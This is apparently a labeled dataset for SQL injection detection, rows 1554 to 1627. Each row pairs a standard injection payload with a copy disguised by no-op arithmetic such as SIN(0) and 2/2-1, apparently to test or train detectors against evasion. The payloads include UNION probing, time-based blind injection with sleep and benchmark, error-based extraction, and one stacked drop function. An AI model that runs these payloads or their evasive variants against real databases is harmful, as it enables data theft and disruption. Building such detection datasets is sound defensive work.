,Query,Label,Original
1554,-3431%'  )   or 2/2-1 or SIN(0) or  2/2-1+9323+0=2/2-1+9323+2/2-1 #,1,-3431%'  )   or 9323  =  9323#
1555,"1 ""  )   union all select null,null,null,null,null,null,null,null,null,null-- ",1,"1""  )   union all select null,null,null,null,null,null,null,null,null,null--"
1556,1  )   as zzip where  2/2-1+2*3-6+5353=SIN(0)+5353+2*3-6+2/2-1+2*3-6 AND 1 aND 1 &&  8-8+3394+SIN(0)=8-8+2/2-1+2/2-1+2*3-6+3092+SIN(0) ,1,1  )   as zzip where 5353  =  5353 and 3394  =  3092
1557,-5774' where  SIN(0)+2*3-6+3632+2*3-6+SIN(0)=2*3-6+0+8-8+8-8+3632+SIN(0) oR 2*3-6 Or 0 OR   (   SIN(0)+2/2-1+3177=2*3-6+2*3-6+0+2/2-1+4222+2*3-6  )  *4222-- ,1,-5774' where 3632  =  3632 or   (  3177  =  4222  )  *4222--
1558,"1% ""  )   aNd 1 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (   2/2-1+3715+2*3-6=8-8+2*3-6+3715+2*3-6+2/2-1  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (   ""% "" +2*3-6+2*3-6=8-8++0+2*3-6 "" ",1,"1%""  )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  ""%""  =  """
1559,"1 ""  )   where  2/2-1+0+2*3-6+7165+0=0+7165+SIN(0)+2*3-6 OR 2/2-1 or  2*3-6+8466+SIN(0)=SIN(0)+SIN(0)+benchmark+2*3-6  (  5000000,md5  (  0x694a4745   )    )   -- ",1,"1""  )   where 7165  =  7165 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --"
1560,"1'  )   Or 0 Or 8-8 Or  SIN(0)+8-8+2*3-6+8466=2/2-1+benchmark+0  (  5000000,md5  (  0x694a4745   )    )    AND 1 aNd   (   2/2-1+2*3-6+'nond'+2/2-1=2/2-1+0+'nond+2*3-6 ",1,"1'  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and   (  'nond'  =  'nond"
1561,"-1617% "" Or 2/2-1 Or 2/2-1 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (   0+2724+0+8-8+2/2-1=SIN(0)+2724+2/2-1+2*3-6  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and 1 And  ""% "" 2/2-1+0++SIN(0)+2*3-6+0=+SIN(0)+2*3-6+8-8 "" ",1,"-1617%"" or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and ""%""  =  """
1562,"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   aND 1 and    (    (    ""xeki "" like  ""xeki ",1,"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (   ""xeki"" like ""xeki"
1563,"1' or 8-8 or  2/2-1+8-8+2*3-6+2/2-1+8421=8-8+SIN(0)+(  select count  (  *  )   from generate_series  (  1,5000000   )    )    ",1,"1' or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   "
1564,1'+  (  select 'nlvq' where  2*3-6+7528+8-8+8-8=2/2-1+8-8+SIN(0)+7528+0 OR 2/2-1 Or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  # ,1,1'+  (  select 'nlvq' where 7528  =  7528 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #
1565,"1% ""   )    )     )   Or 8-8 OR char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85   )+2/2-1+2/2-1=8-8+0+regexp_substring+0  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   && 1 aNd 1 aNd    (    (     (   ""% "" 2/2-1+0++0+SIN(0)+2*3-6=+0+2*3-6+2/2-1+2*3-6 "" ",1,"1%""   )    )     )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  ""%""  =  """
1566,"1 ""   )    )    as brwj where  8-8+2*3-6+9180=2*3-6+8-8+8-8+2/2-1+8-8+9180 ",1,"1""   )    )    as brwj where 9180  =  9180"
1567,"1 "" aND 1 aND 1 aNd   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (   2/2-1+9067+SIN(0)+8-8+2*3-6+8-8=2*3-6+9067,1+0+SIN(0)+SIN(0)+0   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   ",1,"1"" and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  "
1568,-7941 OR SIN(0) or   (   0+2*3-6+8-8+5822=SIN(0)+8754+SIN(0)+2/2-1  )  *8754-- eepn ,1,-7941 or   (  5822  =  8754  )  *8754-- eepn
1569,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual And 1 And    (    (    ""gydr "" like  ""gydr ",1,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (   ""gydr"" like ""gydr"
1570,"1% "" AND 1 And 1 && updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (   2*3-6+3393+2/2-1=0+0+3393,1+2/2-1+SIN(0)+2*3-6   )    )     )  ,0x717a767a71  )  ,1161  )   and  ""% "" 8-8+2*3-6++8-8+0=0+8-8+SIN(0)+2/2-1+2/2-1+ "" ",1,"1%"" and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and ""%""  =  """
1571,1%'   )    )    AND 1 aNd   (   2/2-1+0+3020+SIN(0)+2*3-6=3020+SIN(0)+8-8  )  *6703 and    (    (    2*3-6+2/2-1+'%'+2/2-1+2*3-6=2*3-6+8-8+2*3-6+'+2*3-6+8-8 ,1,1%'   )    )    and   (  3020  =  3020  )  *6703 and    (    (   '%'  =  '
1572,-7758%'   )    )     )   OR 8-8 or 2/2-1 OR  2/2-1+8-8+8-8+3038+SIN(0)+8-8=8-8+0+3038+0+8-8+2*3-6 ,1,-7758%'   )    )     )   or 3038  =  3038
1573,"1% "" and 1 and  0+2716+SIN(0)+8-8+0+SIN(0)=2/2-1+(+0  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  -- ",1,"1%"" and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --"
1574,"-6519'   )    )    as tdlt where  SIN(0)+2/2-1+5040=2*3-6+2/2-1+5040+2/2-1+0 OR 8-8 OR 0 oR  8-8+SIN(0)+1570+SIN(0)+2*3-6=2*3-6+8-8+convert+8-8+8-8+0  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (   2*3-6+2*3-6+SIN(0)+1570+SIN(0)+0=2*3-6+1570+8-8+8-8+2*3-6+8-8  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  -- ",1,"-6519'   )    )    as tdlt where 5040  =  5040 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --"
1575,"-4305   )    )     )   union all select 2401,2401-- ",1,"-4305   )    )     )   union all select 2401,2401--"
1576,-1277'   )    )     )   order by 1-- ,1,-1277'   )    )     )   order by 1--
1577,"-1510 ""  )   as rqrv where  2/2-1+4507+0=2/2-1+4507+2/2-1+2*3-6 union all select 4507,4507,4507,4507,4507-- ",1,"-1510""  )   as rqrv where 4507  =  4507 union all select 4507,4507,4507,4507,4507--"
1578,select   (  case when   (   2/2-1+0+1499+0+8-8+0=SIN(0)+2*3-6+2*3-6+4923+0+2/2-1  )   then 1499 else 1/  (  select 0  )   end  )  -- ,1,select   (  case when   (  1499  =  4923  )   then 1499 else 1/  (  select 0  )   end  )  --
1579,1 Or 0 Or sleep  (  5  )  # tdgb ,1,1 or sleep  (  5  )  # tdgb
1580,"1% ""   )    )    Or 0 || 2*3-6 OR char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83   8-8+2/2-1+)+2/2-1+2/2-1=2/2-1+regexp_substring+2/2-1+0+SIN(0)+0  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  -- ",1,"1%""   )    )    or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --"
1581,"1% ""   )    )     )   aNd 1 and  0+2*3-6+5556+8-8+8-8=SIN(0)+2*3-6+2*3-6+(  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (   ""% "" 2/2-1++0+2/2-1=2/2-1+2/2-1+ "" ",1,"1%""   )    )     )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  ""%""  =  """
1582,"1 "" and 1 aND sleep  (  5  )   and  ""tdid "" like  ""tdid ",1,"1"" and sleep  (  5  )   and ""tdid"" like ""tdid"
1583,1'   )    )    rlike   (  select   (  case when   (   8-8+0+2*3-6+2*3-6+0+7689=2/2-1+7689+SIN(0)+0+2/2-1  )   then 1 else 0x28 end   )    )    aND 1 And 1 And    (    (   'czqk' like 'czqk ,1,1'   )    )    rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (   'czqk' like 'czqk
1584,1'   )    )    as kdse where  SIN(0)+2*3-6+6767+2*3-6+SIN(0)=6767+2*3-6+8-8 rlike sleep  (  5  )  # ,1,1'   )    )    as kdse where 6767  =  6767 rlike sleep  (  5  )  #
1585,"1 ""  )   And 1 aND  SIN(0)+8-8+6055+8-8+2/2-1=ctxsys.drithsx.sn+0+2/2-1  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  OR 2*3-6 or  (  select   (  case when   (   8-8+2/2-1+6055+0=2/2-1+8-8+6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (   ""rrbl "" 8-8+2*3-6+0+0++2/2-1=SIN(0)+SIN(0)++2/2-1+2*3-6 ""rrbl ",1,"1""  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  ""rrbl""  =  ""rrbl"
1586,"1   )    )    as cusv where  2*3-6+SIN(0)+4871=SIN(0)+4871+2/2-1+0 aND 1 aND elt  (   0+1210+2*3-6+0=2*3-6+2/2-1+2*3-6+1210,sleep+SIN(0)+2/2-1  (  5   )    )   -- ",1,"1   )    )    as cusv where 4871  =  4871 and elt  (  1210  =  1210,sleep  (  5   )    )   --"
1587,"-9440 "" union all select 5599,5599,5599,5599,5599-- ",1,"-9440"" union all select 5599,5599,5599,5599,5599--"
1588,"-5204 ""  )   union all select 7186,7186,7186-- ",1,"-5204""  )   union all select 7186,7186,7186--"
1589,"1'   )    )     )   Or 2*3-6 OR char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85   8-8+)+SIN(0)+2/2-1=2*3-6+regexp_substring+2*3-6  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   aNd 1 aND    (    (     (   'ujjr'+SIN(0)+SIN(0)+8-8='ujjr+2/2-1+2*3-6+8-8+2/2-1+SIN(0) ",1,"1'   )    )     )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  'ujjr'  =  'ujjr"
1590,"1'  )   as dvoy where  8-8+7906+8-8+SIN(0)=SIN(0)+0+7906 aND 1 AND 1 and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90   )+2*3-6+0+2*3-6=regexp_substring+2*3-6+8-8  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  -- ",1,"1'  )   as dvoy where 7906  =  7906 and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --"
1591,"1% ""  )   AND 1 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (   2*3-6+2*3-6+7982+SIN(0)+2/2-1=0+SIN(0)+7982,1+0+2/2-1   )    )     )  ,0x717a767a71   )    )    and   (   ""% "" 2*3-6++8-8+8-8+2*3-6=SIN(0)++0+2/2-1+2*3-6 "" ",1,"1%""  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  ""%""  =  """
1592,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and 1 And    (    (    ""weku "" like  ""weku ",1,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (   ""weku"" like ""weku"
1593,"1'+  (  select kqac where  2*3-6+0+0+4362=SIN(0)+2/2-1+2/2-1+0+4362+SIN(0) and 1 And  2*3-6+8-8+8312+SIN(0)=dbms_pipe.receive_message+2*3-6+SIN(0)  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  -- ",1,"1'+  (  select kqac where 4362  =  4362 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --"
1594,"-5616 ""   )    )     )   or 2*3-6 OR 2*3-6 || 0 OR  2*3-6+2/2-1+1570=0+0+2/2-1+convert+8-8  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (   0+SIN(0)+SIN(0)+1570+2/2-1+8-8=0+2*3-6+1570+SIN(0)+SIN(0)  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   AND 1 aNd    (    (     (   ""hdrb "" like  ""hdrb ",1,"-5616""   )    )     )   or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  ""hdrb"" like ""hdrb"
1595,"1 ""   )    )    And 1 AND  SIN(0)+8-8+SIN(0)+0+7533+2/2-1=SIN(0)+0+7533+2/2-1 and    (    (    ""rnni "" like  ""rnni ",1,"1""   )    )    and 7533  =  7533 and    (    (   ""rnni"" like ""rnni"
1596,-4557 oR 2*3-6 OR 2*3-6 oR  2*3-6+6872+8-8=2/2-1+0+6872--+SIN(0)+0 kkte ,1,-4557 or 6872  =  6872-- kkte
1597, (  select   (  case when   (   2*3-6+2/2-1+6581=0+6581+8-8  )   then 1 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual  )  ,1, (  select   (  case when   (  6581  =  6581  )   then 1 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual  ) 
1598,1  )   as cwsi where  8-8+7360+8-8=0+7360+2/2-1+8-8 Or 0 Or sleep  (  5  )  # ,1,1  )   as cwsi where 7360  =  7360 or sleep  (  5  )  #
1599,-2307'   )    )     )   OR 0 OR 8-8 OR 2/2-1 or  0+2*3-6+0+6872+SIN(0)=SIN(0)+6872+8-8 AND 1 AND    (    (     (  'fyok' like 'fyok ,1,-2307'   )    )     )   or 6872  =  6872 and    (    (     (  'fyok' like 'fyok
1600,1%' or 8-8 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  # ,1,1%' or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #
1601,"1 ""   )    )    as ufba where  0+4049+0+SIN(0)=8-8+4049+8-8 ",1,"1""   )    )    as ufba where 4049  =  4049"
1602,"1 ""  )   where  0+9447+SIN(0)+2*3-6=8-8+SIN(0)+2/2-1+9447+2*3-6+2/2-1 ",1,"1""  )   where 9447  =  9447"
1603,"1'   )    )     )   AND 1 aND  SIN(0)+8-8+0+2*3-6+2388+2/2-1=2/2-1+8-8+benchmark  (  5000000,md5  (  0x6d457153   )    )   # ",1,"1'   )    )     )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #"
1604,"1 "" where  3678+2/2-1+8-8=2/2-1+3678+8-8+8-8+8-8+SIN(0) And 1 and  2*3-6+8-8+0+6537+8-8=SIN(0)+8-8+8-8+dbms_pipe.receive_message+2/2-1  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  -- ",1,"1"" where 3678  =  3678 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --"
1605,1'  )   as xiqw where  2*3-6+8507+0+8-8=2*3-6+8-8+8507 rlike sleep  (  5  )  -- ,1,1'  )   as xiqw where 8507  =  8507 rlike sleep  (  5  )  --
1606,"1'  )   aNd 1 AND  8-8+6510+2/2-1+0=2/2-1+(+SIN(0)+2/2-1+SIN(0)  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and   (   2/2-1+0+0+'zpzf'+8-8+2/2-1=0+'zpzf+0+SIN(0) ",1,"1'  )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and   (  'zpzf'  =  'zpzf"
1607,end aNd 1 and   (  'rlux' like 'rlux ,1,end and   (  'rlux' like 'rlux
1608,"1,  (  select   (  case when   (   2*3-6+2*3-6+7616+8-8+2/2-1=2*3-6+0+2/2-1+2/2-1+7616+SIN(0)  )   then 1 else 1/  (  select 0  )   end   )    )    ",1,"1,  (  select   (  case when   (  7616  =  7616  )   then 1 else 1/  (  select 0  )   end   )    )   "
1609,1'   )    )    as vwua where  2*3-6+0+8099+2*3-6+2*3-6+SIN(0)=2*3-6+2/2-1+8099+2*3-6 union all select null-- ,1,1'   )    )    as vwua where 8099  =  8099 union all select null--
1610,1  )   rlike   (  select   (  case when   (   2/2-1+7689+2*3-6+0=8-8+7689+SIN(0)+2*3-6  )   then 1 else 0x28 end   )    )  ,1,1  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    ) 
1611,"-2920 ""   )    )    as zdgv where  SIN(0)+SIN(0)+8-8+9702+8-8=8-8+8-8+2*3-6+9702+SIN(0)+8-8 Or 2/2-1 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (   2*3-6+2/2-1+2724+2*3-6=2/2-1+2*3-6+2724+8-8  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  -- ",1,"-2920""   )    )    as zdgv where 9702  =  9702 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --"
1612,"1'||  (  select 'qsgi' where  2*3-6+1707+0+2/2-1+2*3-6+SIN(0)=2/2-1+2*3-6+1707+2*3-6+0 Or SIN(0) Or  9643+2*3-6+0=8-8+SIN(0)+(+SIN(0)+SIN(0)+2*3-6  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3   )    )   ||' ",1,"1'||  (  select 'qsgi' where 1707  =  1707 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3   )    )   ||'"
1613,"1'+  (  select 'arzm' where  2*3-6+6464+2*3-6+8-8+SIN(0)+0=0+6464+8-8+SIN(0) or SIN(0) OR  8-8+8-8+0+8466+2*3-6=2/2-1+2*3-6+2*3-6+benchmark  (  5000000,md5  (  0x694a4745   )    )     )  +' ",1,"1'+  (  select 'arzm' where 6464  =  6464 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )     )  +'"
1614,select sleep  (  5  )   aND 1 aNd 1 aNd   (  'hhlq' like 'hhlq ,1,select sleep  (  5  )   and   (  'hhlq' like 'hhlq
1615,"1'  )   aND 1 aNd 1 And extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (   8-8+2*3-6+7982+SIN(0)+SIN(0)+SIN(0)=SIN(0)+SIN(0)+7982,1+8-8   )    )     )  ,0x717a767a71   )    )    and   (  'pmzp' like 'pmzp ",1,"1'  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  'pmzp' like 'pmzp"
1616,"1%' AND 1 aNd  0+2*3-6+SIN(0)+6510+0=0+2/2-1+(+0+SIN(0)  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and  SIN(0)+SIN(0)+'%'+8-8+2/2-1=0+'+0+SIN(0)+2/2-1 ",1,"1%' and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and '%'  =  '"
1617, (  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   oR SIN(0) or  (  select   (  case when   (   2*3-6+SIN(0)+0+7992+2/2-1+SIN(0)=2*3-6+2*3-6+7992+SIN(0)+0+0  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric   )    )  ,1, (  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  7992  =  7992  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric   )    ) 
1618,-9564 Or 0 OR 2/2-1 or 0 ||  2*3-6+4144+0+8-8+0+SIN(0)=2*3-6+(+8-8  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (   2*3-6+SIN(0)+4144=SIN(0)+2/2-1+4144+2*3-6  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  ,1,-9564 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  ) 
1619,"1 ""   )    )    as ljhz where  2*3-6+8-8+2416=8-8+2416+2*3-6+8-8 ",1,"1""   )    )    as ljhz where 2416  =  2416"
1620,1'+  (  select ohqr where  0+5610+SIN(0)+2/2-1=2*3-6+SIN(0)+2*3-6+2*3-6+5610+8-8 ,1,1'+  (  select ohqr where 5610  =  5610
1621,"1 ""   )    )     )   or 8-8 OR   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   AND 1 aNd    (    (     (   ""epfg "" like  ""epfg ",1,"1""   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (     (  ""epfg"" like ""epfg"
1622,"1'  )   And 1 AND make_set  (   2/2-1+8403+0+SIN(0)=8-8+8403,8899+8-8  )   and   (   8-8+'ojag'+2*3-6+2*3-6+2*3-6=2*3-6+2/2-1+'ojag+2*3-6+2*3-6 ",1,"1'  )   and make_set  (  8403  =  8403,8899  )   and   (  'ojag'  =  'ojag"
1623,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    ",1,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )   "
1624,"-7584' union all select 1132,1132,1132,1132,1132,1132,1132,1132,1132,1132# ",1,"-7584' union all select 1132,1132,1132,1132,1132,1132,1132,1132,1132,1132#"
1625,1 where  2*3-6+0+4641+SIN(0)=2*3-6+2/2-1+4641+2/2-1+0 ,1,1 where 4641  =  4641
1626,if  (   2*3-6+8537+0+SIN(0)+2/2-1+2*3-6=0+7034+2/2-1+SIN(0)+2*3-6  )   select 8537 else drop function vqmp-- ,1,if  (  8537  =  7034  )   select 8537 else drop function vqmp--
1627,"1  )   as estm where  0+0+4809=2/2-1+2/2-1+4809+0+2*3-6+0 union all select null,null,null-- ",1,"1  )   as estm where 4809  =  4809 union all select null,null,null--"
